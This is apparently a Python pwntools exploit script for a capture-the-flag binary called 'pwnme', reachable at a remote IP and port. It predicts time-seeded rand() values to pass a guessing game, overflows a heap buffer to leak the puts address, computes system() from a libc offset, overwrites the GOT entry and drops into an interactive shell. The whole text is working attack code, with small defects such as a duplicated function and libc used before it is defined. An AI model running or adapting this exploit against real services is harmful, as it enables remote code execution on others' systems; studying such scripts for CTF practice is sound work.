from pwn import *
DEBUG=1
list = [ ]
if DEBUG:
    #this libc doesn't work on my ubuntu
    #os.environ["LD_PRELOAD"] = os.path.join(os.getcwd(),'libc.so.6') 
    #context.log_level = 'debug'
    p = process("./pwnme")
    #so use ida to get offset = system_addr - puts_addr
    offset = -0x24f30

else:
    context.log_level = 'info'
    p = remote("117.34.105.33",6002)
    #here is use elf(libc)
    offset = libc.symbols['system'] - libc.symbols['puts']

#init time_seed table
#rand() will prouce same randnum-seq if srand's seed is same 
def rinit():
    f = os.popen('./rand')
    for i in range(30):
        list.append([])
        for a in f.readlines():
            list[i].append(int(a))
        f = os.popen("./rand %d" % (list[i][0]-1))
    # -1 is after process up

rinit()
libc = ELF('./libc.so.6')
#elf = ELF("./pwnme")

#init time_seed table
#rand() will prouce same randnum-seq if srand's seed is same 
def rinit():
    f = os.popen('./rand')
    for i in range(30):
        list.append([])
        for a in f.readlines():
            list[i].append(int(a))  
        f = os.popen("./rand %d" % (list[i][0]-1))

def sign(name,uid,addr,email,code):
    p.recvuntil("name:")
    p.sendline(name)
    p.recvuntil("300:")
    p.sendline(uid)
    p.recvuntil("address:")
    p.sendline(addr)
    p.recvuntil("mail:")
    p.sendline(email)
    p.recvuntil("changed):")
    p.sendline(code)

def game(s):
    while 1:
        if len(list)==s:
            print "Can't pass game"
            exit()
        for i in range(1,1025):
           p.recvuntil("return:")
           p.sendline(str(list[s][i]))
           p.recvline()
           r = p.recvline()
           if r != "excellent!\n":
                s = s + 1
                print "net_try...%d"%(s)
                break
        if i<1024:continue
        print "Pass game!"
        return True
def exp():     
    #uid=200 can skip user check
    sign("shell01","200","pz","admin@cooldup.com","sh")
    game(0)
    p.recvuntil("advice")
    plt_puts = 0x804b030
    #payload is {0x80 padding + 0x8 chunk_head + 0x4 show + 0x4 edit}
    payload = "a" * (0x80+8) + p32(plt_puts) * 2 
    p.sendline(payload)
    puts_addr = p.recvuntil("try")[1:5]
    puts_addr = u32(puts_addr)
    print 'puts_addr:0x%x' % (puts_addr)
    system_addr = puts_addr + offset
    p.sendline("y")
    p.recvuntil("name")
    p.sendline("y")
    #make plt_puts_addr point to system_addr
    p.sendline(p32(system_addr))
    p.recvuntil("done!")
    p.interactive()
if __name__ == "__main__":
    exp()
